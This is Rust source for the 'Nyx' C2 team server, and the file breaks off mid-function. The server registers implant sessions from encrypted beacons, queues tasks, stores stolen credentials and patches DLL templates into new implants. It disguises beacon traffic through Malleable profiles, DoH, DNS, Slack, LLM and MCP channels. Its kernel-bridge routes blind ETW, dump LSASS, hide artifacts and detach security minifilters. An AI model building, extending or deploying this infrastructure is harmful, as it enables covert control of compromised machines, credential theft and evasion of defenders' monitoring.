//! Nyx team server (HTTP, P0).
//!
//! Routes:
//! - `POST /beacon`            — implant traffic (encrypted frame); returns queued tasks.
//! - `GET  /api/sessions`      — list registered sessions (JSON).
//! - `POST /api/task`          — queue a task for a session (JSON).
//! - `GET  /api/results`       — drain task results for a session (JSON).

pub mod audit;
pub mod extc2_relay;
pub mod implant_gen;
pub mod kernel;
pub mod operators;
pub mod tls;

use std::sync::Arc;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

/// Maximum queued-but-undelivered tasks per session. An authenticated operator
/// (or a compromised token) can otherwise enqueue unbounded tasks → OOM. Past
/// this the enqueue is rejected with 503 (back-pressure), not silently dropped.
pub const MAX_PENDING_PER_SESSION: usize = 1024;
/// Maximum undelivered result entries per session. A rogue/compromised implant
/// streaming Output/FileChunk blobs could otherwise fill RAM forever; past this
/// the oldest entries are evicted (results are best-effort — operators drain
/// them, and an unattended server shouldn't OOM on a chatty beacon).
pub const MAX_RESULTS_PER_SESSION: usize = 4096;
/// Maximum concurrent sessions. Beacon check-in is unauthenticated (anyone who
/// speaks the protocol registers a session), so without a cap an attacker can
/// flood the registry with distinct ephemeral keys → OOM.
pub const MAX_SESSIONS: usize = 4096;
/// Per-request body cap on the beacon endpoint (and any profile-declared beacon
/// URIs). A beacon body is exactly ONE encrypted frame — `[32 pubkey][8 counter]
/// [4 ct_len][ct ≤ 256 KiB (the protocol's MAX_CT_LEN)][16 tag]` — so the real
/// ceiling is ~256 KiB + header. 512 KiB is generous while staying ~8× under the
/// 4 MiB cap on the operator API routes, so an unauthenticated flood against
/// `/beacon` (check-in is crypto-gated, not token-gated, by design) can't buffer
/// the full API allowance per hit.
pub const BEACON_BODY_LIMIT: usize = 512 * 1024;

use axum::{
    body::Bytes,
    extract::{ConnectInfo, DefaultBodyLimit, Query, State},
    http::{HeaderMap, Method, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
use dashmap::mapref::entry::Entry;
use dashmap::DashMap;
use nyx_protocol::{
    encode_frame_dir, open_frame, parse_frame, wire::Reader, Command, Direction, FileOp,
    Response as MsgResponse, ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
};
// REST view types — the server serializes these for /api/* responses. Using
// nyx-rest as the single source of truth prevents field drift between the
// server's serializers and the clients' deserializers.
use nyx_rest::{ProfileView, ResultView, SessionView, TaskAck, TaskView};
use serde::Deserialize;
use sha2::Digest;

/// A session is keyed by the implant's 32-byte ephemeral public key.
pub type SessionId = [u8; 32];

pub struct Session {
    pub key: SessionKey,
    pub info: SessionInfo,
    pub last_recv: u64,
    pub send_counter: u64,
    pub next_task_id: u64,
    pub pending: Vec<Task>,
    pub results: Vec<TaskResponse>,
    pub created: Instant,
    /// Time of the most recent beacon check-in (updated on every valid frame).
    /// Used by the session GC to evict idle sessions.
    pub last_seen: Instant,
    /// Inbound TLS JA3 (MD5, 32 hex) of the connecting beacon, if captured by
    /// the ClientHello sniffer. `None` on plaintext or when sniff failed.
    pub ja3: Option<String>,
    /// Inbound TLS JA4 (FoxIO `a_b_c`), if captured.
    pub ja4: Option<String>,
    /// `true` while this session was loaded from the persistent store at boot
    /// and has NOT beaconed since the restart. Surfaced as `stale` in
    /// `SessionView` so operators see at-a-glance which sessions are from a
    /// prior server lifetime. Cleared on the first live check-in (new OR
    /// existing-session branch — any valid frame clears it).
    pub stale: bool,
    /// Last time the session's metadata was flushed to the persistent store,
    /// for throttling the cheap `touch()` update on the existing-session beacon
    /// path. Kept on the Session so the throttle is per-session; 0 means "never
    /// flushed" so the first touch always goes through.
    pub persisted_last_touch: Instant,
}

pub struct AppState {
    pub keypair: ServerKeypair,
    pub sessions: DashMap<SessionId, Session>,
    /// Active Malleable C2 profile (loaded from `NYX_PROFILE`). When present,
    /// the beacon handler is also served at the profile's transaction URIs.
    pub profile: Option<nyx_profile::Profile>,
    /// If set, control-API requests (`/api/*`) must carry
    /// `Authorization: Bearer <api_token>`. Beacon traffic is exempt (implants
    /// authenticate cryptographically, not with a shared token).
    pub api_token: Option<String>,
    /// Optional kill date (Unix seconds). Checked at boot AND on every beacon:
    /// once the current time passes it, the server stops serving beacons.
    pub killdate: Option<u64>,
    /// Scripting event bus. Hooks are registered at construction; the beacon
    /// handler fires `SessionNew` / `ResultReceived` events into it.
    pub events: nyx_scripting::EventBus,
    /// Inbound TLS fingerprints keyed by peer socket address, populated by the
    /// ClientHello sniffer on the TLS path. The beacon handler pops the entry
    /// for its peer on check-in and stamps it onto the new session. Plaintext
    /// (dev) connections never populate this (no ClientHello to sniff).
    pub fingerprints: DashMap<std::net::SocketAddr, Fingerprint>,
    /// Persistent credential store (SQLite, WAL). Survives a team-server
    /// restart — UNLIKE sessions (which are in-memory). Shared across operators:
    /// a cred POSTed by one is visible to all via `GET /api/creds`.
    pub creds: Arc<nyx_store::CredStore>,
    /// Named-operator registry (Phase 3). Empty = open mode; non-empty gates
    /// `/api/*` by per-operator `name:secret` (or the `_legacy` NYX_TOKEN).
    pub operators: Arc<operators::OperatorRegistry>,
    /// Action audit log (Phase 3). `None` in tests/`AppState::default()`;
    /// `Some` when the server boots with a log path.
    pub audit: Option<Arc<audit::AuditWriter>>,
    /// Kernel daemon bridge (P6). `None` when no daemon configured.
    pub kernel: Option<Arc<kernel::KernelBridge>>,
    /// DLL template for implant generation (loaded at startup via `--template`).
    /// The server patches this in-memory DLL at generation time to embed the
    /// per-implant config. `None` = implant generation disabled.
    pub template: Option<Arc<Vec<u8>>>,
    /// Rate limiter for the implant generation endpoint. Keyed by
    /// "callback:port", stores sliding-window timestamps of recent generation
    /// requests to prevent enumeration/spray against a single target.
    pub implant_rate_limiter: DashMap<String, Vec<Instant>>,
    /// Persistent implant/payload store (SQLite, WAL). Shared with the cred
    /// store's DB file; manages the `implants` table. `None` if no store path
    /// was configured (test/dev mode).
    pub implants: Option<Arc<nyx_store::ImplantStore>>,
    /// Persistent session-metadata store (SQLite, WAL). Shares the cred store's
    /// DB file; manages the `sessions` table. The in-memory `sessions` DashMap
    /// remains the PRIMARY read path — this store is the durability layer that
    /// lets the registry SURVIVE a team-server restart. `None` when no store
    /// path is configured (test/dev mode: persistence is skipped, sessions are
    /// back to in-memory-only as before).
    pub sessions_db: Option<Arc<SessionPersistence>>,
    /// External-C2 relay config (Slack/MCP/...). When a channel is configured
    /// here, the corresponding `/extc2/<service>` route forwards the sealed
    /// reply frame to the real third-party API via the `nyx-transport` crate's
    /// channel impl — making the server an actual external-C2 relay rather
    /// than just a URI alias for `/beacon`. `None` per channel = relay disabled
    /// for that channel (the route still works as a plain beacon endpoint).
    /// See `extc2_relay.rs`.
    pub extc2: extc2_relay::ExtC2RelayConfig,
}

/// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
///
/// `created` is stamped at insertion so the periodic GC sweep can evict stale
/// entries (fingerprints are only useful during the brief TLS-handshake →
/// check-in window; an unauthenticated attacker can otherwise open thousands of
/// TLS connections and grow this map without bound → OOM).
#[derive(Debug, Clone)]
pub struct Fingerprint {
    pub ja3: Option<String>,
    pub ja4: Option<String>,
    pub created: Instant,
}

impl Default for Fingerprint {
    fn default() -> Self {
        Self {
            ja3: None,
            ja4: None,
            created: Instant::now(),
        }
    }
}

impl AppState {
    /// Register the server's built-in scripting hooks (currently a hook that
    /// mirrors events into the tracing log). Call once, before sharing.
    pub fn register_default_hooks(&mut self) {
        self.events.register(Box::new(TracingEventHook));
    }
}

impl Default for AppState {
    fn default() -> Self {
        Self {
            keypair: ServerKeypair::generate()
                .expect("default AppState keypair: OsRng is infallible on supported targets"),
            sessions: DashMap::new(),
            profile: None,
            api_token: None,
            killdate: None,
            events: nyx_scripting::EventBus::new(),
            fingerprints: DashMap::new(),
            creds: Arc::new(nyx_store::CredStore::open_in_memory().expect("in-memory cred store")),
            operators: Arc::new(operators::OperatorRegistry::empty()),
            audit: None,
            kernel: None,
            template: None,
            implant_rate_limiter: DashMap::new(),
            implants: None,
            sessions_db: None,
            extc2: extc2_relay::ExtC2RelayConfig::default(),
        }
    }
}

// ── Session persistence (SQLite durability layer) ─────────────────────────
//
// The in-memory `DashMap` is the primary read path; SQLite is the durability
// layer that lets the session registry SURVIVE a team-server restart. Writes
// from the hot beacon path are fire-and-forget: they hand a cheap command to a
// dedicated background thread over an `std::sync::mpsc` channel (no allocation
// beyond the enum discriminant + the owned strings that must outlive the beacon
// request), so a slow disk can NEVER block a check-in or a task delivery.
//
// Why a dedicated thread (not `tokio::task::spawn_blocking`): the beacon
// handlers (`handle_beacon`/`handle_frame`) are SYNCHRONOUS — they run inline
// under axum's connection dispatcher, and the unit tests call them directly
// with no runtime at all. So the write hand-off has to work from sync code
// without a `Handle`. A long-lived OS thread fed by an mpsc channel is the
// simplest sound design: `try_send` is non-blocking and infallible for the
// caller, and the thread owns the SQLite connection (no `Send`/`Sync` worries).

/// Minimum gap between cheap `touch()` (last_seen-only) writes for a single
/// session on the existing-session beacon path. Coarsens the persistence of
/// `last_seen` to at most one row update per session per 15s — frequent
/// check-ins (sub-second sleep) would otherwise hammer SQLite pointlessly, and
/// a 15s granularity is well inside the idle-GC threshold (default 24h). A full
/// upsert (new-session check-in) ignores this — it carries fresh metadata and
/// runs once per session lifetime.
const PERSIST_TOUCH_THROTTLE: std::time::Duration = std::time::Duration::from_secs(15);

/// A write command handed to the persistence background thread. Each variant
/// owns all the data it needs so the thread never borrows from the beacon path.
enum PersistCmd {
    /// Upsert full session metadata (new-session check-in). Carries the
    /// ORIGINAL `first_seen` so creation time survives re-check-ins.
    Upsert { rec: nyx_store::SessionRecord },
    /// Bump only `last_seen` for an existing session (throttled per-session).
    Touch { session_id: String, last_seen: u64 },
    /// Delete a session row (GC evicted it). The store must not accumulate
    /// dead rows forever.
    Delete { session_id: String },
}

/// The persistence handle: a background thread + its command channel. Cheap to
/// clone (`Sender` is `Sync`); every clone feeds the same single thread, so
/// SQLite sees one serialized writer.
pub struct SessionPersistence {
    tx: std::sync::mpsc::Sender<PersistCmd>,
    /// The backing store, kept so the boot path can `list()` synchronously
    /// (before the background thread is needed for writes).
    store: Arc<nyx_store::SessionStore>,
}

impl Clone for SessionPersistence {
    fn clone(&self) -> Self {
        Self {
            tx: self.tx.clone(),
            store: self.store.clone(),
        }
    }
}

impl SessionPersistence {
    /// Spawn a persistence writer over `store`. Returns a handle whose `store()`
    /// can be queried synchronously (used at boot to load existing rows) and
    /// whose `upsert`/`touch`/`delete` enqueue fire-and-forget writes.
    pub fn spawn(store: Arc<nyx_store::SessionStore>) -> Self {
        let (tx, rx) = std::sync::mpsc::channel::<PersistCmd>();
        std::thread::Builder::new()
            .name("nyx-session-persist".into())
            .spawn({
                let store = store.clone();
                move || Self::run(rx, store)
            })
            .expect("spawn session-persistence writer thread");
        Self { tx, store }
    }

    /// The writer loop. Pulls commands off the channel and applies them to the
    /// store. Errors are logged but never propagate: persistence is best-effort
    /// (the in-memory registry is authoritative for liveness), and killing the
    /// server on a SQLite hiccup would defeat the purpose.
    fn run(rx: std::sync::mpsc::Receiver<PersistCmd>, store: Arc<nyx_store::SessionStore>) {
        for cmd in rx {
            let (label, res) = match cmd {
                PersistCmd::Upsert { rec } => ("upsert", store.upsert(&rec)),
                PersistCmd::Touch {
                    session_id,
                    last_seen,
                } => ("touch", store.touch(&session_id, last_seen).map(|_| ())),
                PersistCmd::Delete { session_id } => {
                    ("delete", store.delete(&session_id).map(|_| ()))
                }
            };
            if let Err(e) = res {
                tracing::warn!(
                    target: "nyx::persist",
                    error = %e, op = label,
                    "session-persistence write failed (best-effort; registry is authoritative)"
                );
            }
        }
        // `rx` returns `None` only when every sender was dropped — i.e. the
        // server is shutting down. Nothing to flush: every command received
        // before this point was applied inline under the connection mutex.
    }

    /// Fire-and-forget upsert. Non-blocking + infallible for the caller: if the
    /// receiver was dropped (server shutting down) the write is silently
    // discarded — the in-memory registry already has this session, and the next
    // boot will re-populate the store on the first check-in anyway.
    pub fn upsert(&self, rec: nyx_store::SessionRecord) {
        let _ = self.tx.send(PersistCmd::Upsert { rec });
    }

    /// Fire-and-forget `last_seen` touch.
    pub fn touch(&self, session_id: String, last_seen: u64) {
        let _ = self.tx.send(PersistCmd::Touch {
            session_id,
            last_seen,
        });
    }

    /// Fire-and-forget delete.
    pub fn delete(&self, session_id: String) {
        let _ = self.tx.send(PersistCmd::Delete { session_id });
    }

    /// Direct access to the backing store for the synchronous boot-time read.
    /// (Writes MUST go through `upsert`/`touch`/`delete` so they hit the
    /// background thread, not the shared connection.)
    pub fn store(&self) -> &nyx_store::SessionStore {
        &self.store
    }
}

/// Current wall-clock time as Unix-epoch seconds. Returns 0 on a pre-epoch
/// clock (the only realistic failure is a badly skewed system clock); used for
/// persisted timestamps where a 0 is benign (worst case the row looks old).
fn now_unix() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Re-hydrate the in-memory session registry from the persistent store at boot.
/// Called from `main` after the `SessionPersistence` handle is built but before
/// the server starts accepting beacons. Sessions restored this way are marked
/// `stale = true`; the first live check-in clears it. Returns the count loaded
/// (for the boot log). Does nothing if persistence is disabled.
pub fn load_persisted_sessions(state: &AppState) -> usize {
    let Some(persist) = &state.sessions_db else {
        return 0;
    };
    let rows = match persist.store().list() {
        Ok(r) => r,
        Err(e) => {
            tracing::warn!(
                error = %e,
                "failed to load persisted sessions; starting with an empty registry"
            );
            return 0;
        }
    };
    let n = rows.len();
    for r in rows {
        let mut key_bytes = [0u8; 32];
        if hex::decode_to_slice(&r.session_id, &mut key_bytes).is_err() {
            // A row with a non-hex/non-32-byte id can't have come from this
            // server (it always writes a 32-byte pubkey hex). Skip it rather
            // than poisoning the registry — a hand-edited DB shouldn't take the
            // server down.
            tracing::warn!(
                session_id = %r.session_id,
                "persisted session has a malformed id; skipping"
            );
            continue;
        }
        // Avoid clobbering a session a racer beacon already registered between
        // the store `list` and here (vanishingly unlikely at boot, but the
        // registry is the authority).
        if state.sessions.contains_key(&key_bytes) {
            continue;
        }
        // `created`/`last_seen` use a synthetic Instant: there's no way to turn
        // a stored wall-clock `u64` back into a monotonic `Instant`, so back-date
        // from now using the stored age. The age/idle GC math is duration-based,
        // so this keeps eviction behaviour consistent with live sessions.
        let now = Instant::now();
        let now_s = now_unix();
        let age_secs = now_s.saturating_sub(r.first_seen);
        let idle_secs = now_s.saturating_sub(r.last_seen);
        let created = now
            .checked_sub(std::time::Duration::from_secs(age_secs))
            .unwrap_or(now);
        let last_seen_instant = now
            .checked_sub(std::time::Duration::from_secs(idle_secs))
            .unwrap_or(now);
        let session = Session {
            // The live session key is re-derived on the FIRST post-restart
            // check-in (handle_frame derives it from the server keypair +
            // pubkey); store a zero placeholder. It is overwritten before any
            // decrypt by the existing-session branch's `s.key.clone()`.
            key: SessionKey::new([0u8; 32]),
            info: SessionInfo {
                beacon_id: r.beacon_id,
                hostname: r.hostname,
                username: r.username,
                os: r.os,
                arch: r.arch,
                pid: r.pid,
                is_admin: r.is_admin,
                // The one-time token already lived in the `implants` table and
                // was consumed at the original check-in; don't replay it.
                auth_token: None,
            },
            // Reset the anti-replay counter for the new server lifetime.
            // Counter space is per-server-identity: a frame from before the
            // restart either fails AEAD under the (possibly new) server key, or
            // carries a counter that's stale only relative to the OLD lifetime.
            // Setting last_recv = 0 lets the first post-restart counter (>= 1)
            // through, which is the correct post-restart semantics.
            last_recv: 0,
            send_counter: 0,
            next_task_id: 1,
            pending: Vec::new(),
            results: Vec::new(),
            created,
            last_seen: last_seen_instant,
            ja3: None,
            ja4: None,
            stale: true,
            persisted_last_touch: last_seen_instant,
        };
        state.sessions.entry(key_bytes).or_insert(session);
    }
    n
}

/// Bridge scripting events into the server's `tracing` log (the default hook).
struct TracingEventHook;

impl nyx_scripting::Hook for TracingEventHook {
    fn name(&self) -> &str {
        "tracing"
    }
    fn on_event(&self, event: &nyx_scripting::Event) {
        match event {
            nyx_scripting::Event::SessionNew(s) => tracing::info!(
                target: "nyx::scripting",
                session = %s.session_id,
                user = %s.username,
                host = %s.hostname,
                "scripting: session_new"
            ),
            nyx_scripting::Event::ResultReceived(r) => tracing::debug!(
                target: "nyx::scripting",
                session = %r.session_id,
                task = r.task_id,
                "scripting: result"
            ),
            nyx_scripting::Event::SessionExit(s) => tracing::info!(
                target: "nyx::scripting",
                session = %s.session_id,
                "scripting: session_exit"
            ),
        }
    }
}

/// Map a wire [`MsgResponse`] to a scripting event's kind + short summary.
fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
    match r {
        MsgResponse::Output(b) => (
            nyx_scripting::ResultKind::Output,
            String::from_utf8_lossy(b).chars().take(64).collect(),
        ),
        MsgResponse::Ok => (nyx_scripting::ResultKind::Ok, String::new()),
        MsgResponse::Err(m) => (nyx_scripting::ResultKind::Err, m.clone()),
        MsgResponse::FileChunk { name, .. } => (
            nyx_scripting::ResultKind::FileChunk,
            format!("<chunk {name}>"),
        ),
        MsgResponse::BofOutput(b) => (
            nyx_scripting::ResultKind::Other,
            String::from_utf8_lossy(b).chars().take(64).collect(),
        ),
        MsgResponse::Channel { chan, .. } => {
            (nyx_scripting::ResultKind::Other, format!("<chan {chan}>"))
        }
        MsgResponse::Image(d) => (
            nyx_scripting::ResultKind::Other,
            format!("<screenshot {} bytes>", d.len()),
        ),
    }
}

/// Load + lint a Malleable C2 profile from disk. Returns the parsed profile, or
/// an error if the file can't be read, fails to parse, or has `c2lint` errors.
pub fn load_profile(path: &std::path::Path) -> anyhow::Result<nyx_profile::Profile> {
    let src = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("read profile {}: {e}", path.display()))?;
    let profile = nyx_profile::parse(&src).map_err(|e| anyhow::anyhow!("parse profile: {e}"))?;
    let errors: Vec<_> = nyx_profile::lint(&profile)
        .into_iter()
        .filter(|d| d.severity == nyx_profile::Severity::Error)
        .collect();
    if errors.is_empty() {
        Ok(profile)
    } else {
        let msgs: Vec<_> = errors
            .iter()
            .map(|d| format!("  line {}: {}", d.line, d.message))
            .collect();
        anyhow::bail!(
            "profile {} has {} lint error(s):\n{}",
            path.display(),
            errors.len(),
            msgs.join("\n")
        )
    }
}

/// Load the server's long-term keypair from `path`, or generate + persist it
/// (0600 on Unix) if absent. With `NYX_KEYFILE` set, sessions survive a server
/// restart instead of getting a fresh identity each boot.
pub fn load_or_create_keypair(
    path: &std::path::Path,
) -> anyhow::Result<nyx_protocol::ServerKeypair> {
    use nyx_protocol::ServerKeypair;
    if path.exists() {
        let bytes = std::fs::read(path)?;
        let arr: [u8; 32] = bytes
            .as_slice()
            .try_into()
            .map_err(|_| anyhow::anyhow!("keyfile {} is not 32 bytes", path.display()))?;
        Ok(ServerKeypair::from_secret_bytes(arr))
    } else {
        let kp = ServerKeypair::generate()
            .map_err(|_| anyhow::anyhow!("CSPRNG failure during keypair generation"))?;
        std::fs::write(path, kp.to_secret_bytes())?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600));
        }
        Ok(kp)
    }
}

/// Load + compile a Rhai operator script (`NYX_SCRIPT`) into a hook. Errors if
/// the file can't be read or has a syntax error.
pub fn load_script(path: &std::path::Path) -> anyhow::Result<nyx_scripting_rhai::RhaiHook> {
    let src = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("read script {}: {e}", path.display()))?;
    nyx_scripting_rhai::RhaiHook::new(&path.display().to_string(), &src)
        .map_err(|e| anyhow::anyhow!("compile script {}: {e}", path.display()))
}

// ── Session GC ────────────────────────────────────────────────────────────

/// Default maximum session age in seconds (7 days). Override with
/// `NYX_SESSION_MAX_AGE`.
const DEFAULT_SESSION_MAX_AGE: u64 = 7 * 24 * 3600;
/// Default maximum session idle time in seconds (24 hours). Override with
/// `NYX_SESSION_MAX_IDLE`. Sessions with pending tasks are NOT evicted by idle.
const DEFAULT_SESSION_MAX_IDLE: u64 = 24 * 3600;
/// Maximum age in seconds of a cached inbound TLS fingerprint. Fingerprints are
/// keyed by peer `SocketAddr` and only consumed by the beacon handler on the
/// check-in following the TLS handshake. Without a TTL an unauthenticated
/// attacker can open thousands of TLS connections (each inserts an entry that's
/// never popped unless a valid check-in follows) and grow the map unboundedly
/// → OOM. 60s comfortably spans the handshake → first beacon round-trip.
const FINGERPRINT_TTL: u64 = 60;

/// Spawn a background task that periodically evicts stale sessions.
///
/// Two policies run every 60 seconds:
/// 1. Age: evict sessions older than `NYX_SESSION_MAX_AGE` (default 7 days).
/// 2. Idle: evict sessions idle (no beacon) longer than `NYX_SESSION_MAX_IDLE`
///    (default 24h) that have zero pending tasks.
///
/// Each eviction is logged at INFO level so operators can see when a beacon
/// drops offline permanently.
///
/// The same sweep also evicts inbound TLS fingerprint cache entries older than
/// [`FINGERPRINT_TTL`], bounding the `fingerprints` map against attacker-driven
/// unbounded growth (H4).
pub fn spawn_session_gc(state: Arc<AppState>) {
    let max_age = std::env::var("NYX_SESSION_MAX_AGE")
        .ok()
        .and_then(|s| s.parse::<u64>().ok())
        .unwrap_or(DEFAULT_SESSION_MAX_AGE);
    let max_idle = std::env::var("NYX_SESSION_MAX_IDLE")
        .ok()
        .and_then(|s| s.parse::<u64>().ok())
        .unwrap_or(DEFAULT_SESSION_MAX_IDLE);

    tokio::spawn(async move {
        let mut interval = tokio::time::interval(std::time::Duration::from_secs(60));
        loop {
            interval.tick().await;
            let now = Instant::now();
            // Collect keys to evict under read-only iteration first (avoids
            // holding a write-lock while doing duration arithmetic).
            let evicted: Vec<SessionId> = state
                .sessions
                .iter()
                .filter_map(|entry| {
                    let age = now.duration_since(entry.value().created).as_secs();
                    let idle = now.duration_since(entry.value().last_seen).as_secs();
                    let too_old = age > max_age;
                    let too_idle = idle > max_idle && entry.value().pending.is_empty();
                    if too_old || too_idle {
                        Some(*entry.key())
                    } else {
                        None
                    }
                })
                .collect();

            for key in &evicted {
                if let Some((_, s)) = state.sessions.remove(key) {
                    let age = now.duration_since(s.created).as_secs();
                    let idle = now.duration_since(s.last_seen).as_secs();
                    tracing::info!(
                        session = %hex::encode(key),
                        host = %s.info.hostname,
                        user = %s.info.username,
                        age_secs = age,
                        idle_secs = idle,
                        pending = s.pending.len(),
                        "session evicted by GC"
                    );
                    // Drop the persisted row too so the store doesn't accumulate
                    // dead sessions forever (the next boot would otherwise
                    // restore a session the runtime just evicted). Fire-and-
                    // forget: the background writer applies it asynchronously.
                    if let Some(persist) = &state.sessions_db {
                        persist.delete(hex::encode(key));
                    }
                }
            }

            if !evicted.is_empty() {
                tracing::info!(evicted = evicted.len(), "session GC sweep complete");
            }

            // Fingerprint GC (H4): evict cached inbound TLS fingerprints older
            // than FINGERPRINT_TTL. An unauthenticated attacker can otherwise
            // open thousands of TLS connections (each inserts an entry that's
            // only popped on a valid check-in) and grow this map without bound.
            // `retain` takes the DashMap shard write lock per shard; this runs
            // on the same 60s interval as the session sweep.
            let before = state.fingerprints.len();
            state
                .fingerprints
                .retain(|_, fp| fp.created.elapsed().as_secs() < FINGERPRINT_TTL);
            let removed = before.saturating_sub(state.fingerprints.len());
            if removed > 0 {
                tracing::info!(evicted = removed, "fingerprint GC sweep complete");
            }
        }
    });
}

pub fn router(state: Arc<AppState>) -> Router {
    // Collect any profile-declared beacon URIs + their `set verb` before `state`
    // moves into the router. The beacon handler is URI-agnostic (it just
    // decrypts the body), so serving it at the profile's transaction URIs makes
    // the beacon path malleable — the most fingerprinted C2 indicator — without
    // touching crypto. We honour `set verb` (GET/POST) so the registered method
    // matches what the profile says the beacon will use.
    let extra: Vec<(String, bool)> = state
        .profile
        .as_ref()
        .map(|p| {
            // (uri, is_post). Each transaction block's verb defaults to its name
            // (http-get → GET, http-post → POST) unless overridden by `set verb`.
            let mut out: Vec<(String, bool)> = Vec::new();
            for (txn, default_post) in [("http-post", true), ("http-get", false)] {
                for b in p.blocks(txn) {
                    let Some(uri) = b.get("uri").map(|u| u.as_str().into_owned()) else {
                        continue;
                    };
                    let verb = b.get("verb").map(|v| v.as_str().to_ascii_uppercase());
                    let is_post = match verb.as_deref() {
                        Some("POST") => true,
                        Some("GET") => false,
                        _ => default_post,
                    };
                    out.push((uri, is_post));
                }
            }
            out
        })
        .unwrap_or_default();

    // Beacon routes (unauthenticated, crypto-gated). A beacon POST carries
    // exactly ONE encrypted frame (≤ ~256 KiB: MAX_CT_LEN + header + tag), so
    // BEACON_BODY_LIMIT (512 KiB) is generous. Keeping it well under the API
    // limit bounds the pre-auth buffering an attacker can trigger per /beacon
    // connection (check-in is crypto-gated, not token-gated, by design).
    // The native DNS beacon (spec-4) POSTs its frame to `/dns` with an
    // `application/dns-message` flavor; the body is still exactly one encrypted
    // frame, so it funnels through the same `beacon` handler as `/beacon`.
    // External C2 endpoints (spec-6). The implant POSTs the raw encrypted frame
    // to `/extc2/<service>` instead of the real third-party API (Slack/Discord/
    // LLM/MCP). The body IS the frame — identical to `/beacon` — so these routes
    // run the same beacon handler to decrypt, queue results, and seal a reply.
    //
    // **Slack** and **MCP** routes go through [`extc2_relay_handler`], which
    // additionally fans the sealed reply out to the real third-party API via
    // the `nyx-transport` crate's `SlackTransport` / `McpTransport` (when the
    // operator has configured `NYX_EXTC2_*`). That makes the server an actual
    // external-C2 relay rather than just a URI alias for `/beacon`.
    //
    // **Discord** and **LLM** still delegate to the plain `beacon` handler
    // pending their own relay wiring (see design notes in `extc2_relay.rs`).
    //
    // `/doh` is the DoH-channel beacon endpoint (spec-2). The DoH channel POSTs
    // the same encrypted frame as `/beacon` but to `/doh` (CS 4.11 DoH Beacon
    // alignment — blends with DoH egress by URI while reusing the full
    // crypto/anti-replay/tasking path). Same body, same `beacon` handler.
    let mut beacon_routes = Router::new()
        .route("/beacon", post(beacon))
        .route("/doh", post(beacon))
        .route("/dns", post(beacon))
        .route("/extc2/slack", post(extc2_relay_handler_slack))
        .route("/extc2/discord", post(beacon))
        .route("/extc2/llm", post(beacon))
        .route("/extc2/mcp", post(extc2_relay_handler_mcp));
    let mut seen = std::collections::HashSet::new();
    for (uri, is_post) in extra {
        if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
            continue;
        }
        beacon_routes = if is_post {
            beacon_routes.route(&uri, post(beacon))
        } else {
            beacon_routes.route(&uri, get(beacon))
        };
    }
    let beacon_routes = beacon_routes.route_layer(DefaultBodyLimit::max(BEACON_BODY_LIMIT));

    // Control-API routes (operator; token-gated when NYX_TOKEN is set). A larger
    // cap so hex-encoded Upload/Bof payloads fit (a 2 MB file → ~4 MB of hex in
    // the JSON body). This layer covers BOTH serving paths — `axum::serve`
    // (plaintext) and the raw-TLS `serve_connection` in main.rs (no built-in
    // limit) — because the layer is baked into the Router's service whichever
    // driver consumes it.
    let api_routes = Router::new()
        .route("/api/sessions", get(list_sessions))
        .route("/api/task", post(post_task))
        .route("/api/tasks", get(get_tasks))
        .route("/api/results", get(get_results))
        .route("/api/profile", get(get_profile))
        .route("/api/creds", get(list_creds).post(post_creds))
        .route("/api/creds/delete", post(delete_cred))
        .route("/api/audit", get(get_audit))
        .route("/api/audit/verify", get(verify_audit))
        // Implant generation (requires NYX_TEMPLATE + implant store at runtime)
        .route("/api/generate-implant", post(implant_gen::generate_implant))
        .route("/api/implants", get(implant_gen::list_implants))
        .route("/api/implant/revoke", post(implant_gen::revoke_implant))
        .layer(DefaultBodyLimit::max(4 * 1024 * 1024));

    // Kernel daemon bridge routes (P6): ONLY register when a `KernelBridge` is
    // wired into AppState (i.e. NYX_KERNEL_DAEMON was set at boot). Without a
    // daemon every handler returns a misleading `{"ok":false,"err":"no daemon"}`,
    // so registering dead routes that always fail just confuses operators. When
    // the bridge is absent, the routes aren't mounted at all — a request to
    // `/api/kernel/*` then gets a plain 404, which is the honest signal that
    // the feature isn't enabled (set NYX_KERNEL_DAEMON=<host:port> to enable).
    let api_routes = if state.kernel.is_some() {
        api_routes
            .route("/api/kernel/status", get(kernel::driver_status))
            .route("/api/kernel/blind-etw", post(kernel::blind_etw))
            .route("/api/kernel/hide", post(kernel::hide))
            .route("/api/kernel/dump-lsass", post(kernel::dump_lsass))
            .route("/api/kernel/neutralize", post(kernel::neutralize))
            .route(
                "/api/kernel/detach-minifilter",
                post(kernel::detach_minifilter),
            )
    } else {
        api_routes
    };

    beacon_routes.merge(api_routes).with_state(state)
}

// ---- implant endpoint ------------------------------------------------------

async fn beacon(
    State(st): State<Arc<AppState>>,
    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
    method: Method,
    headers: HeaderMap,
    body: Bytes,
) -> Response {
    match handle_beacon(&st, &peer, &method, &headers, &body) {
        Ok(frame) => shape_beacon_response(&st, frame),
        Err(e) => {
            tracing::warn!(error = %e, "beacon handler error");
            StatusCode::BAD_REQUEST.into_response()
        }
    }
}

/// External-C2 Slack relay handler.
///
/// Runs the normal beacon path (decrypt → queue results → seal reply) and then,
/// **in addition**, forwards the sealed reply frame to the real Slack channel
/// via [`nyx_transport::SlackTransport`] when the operator has configured
/// `NYX_EXTC2_SLACK_TOKEN` + `NYX_EXTC2_SLACK_CHANNEL`. The relay is
/// fire-and-forget: a Slack outage never fails the beacon reply, which is
/// still returned to the implant over the local HTTP connection exactly as
/// `/beacon` would have returned it.
///
/// When the Slack relay is unconfigured, this handler is functionally
/// identical to [`beacon`] — preserving the legacy behaviour for operators
/// who haven't stood up the Slack side yet.
async fn extc2_relay_handler_slack(
    State(st): State<Arc<AppState>>,
    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
    method: Method,
    headers: HeaderMap,
    body: Bytes,
) -> Response {
    match handle_beacon(&st, &peer, &method, &headers, &body) {
        Ok(frame) => {
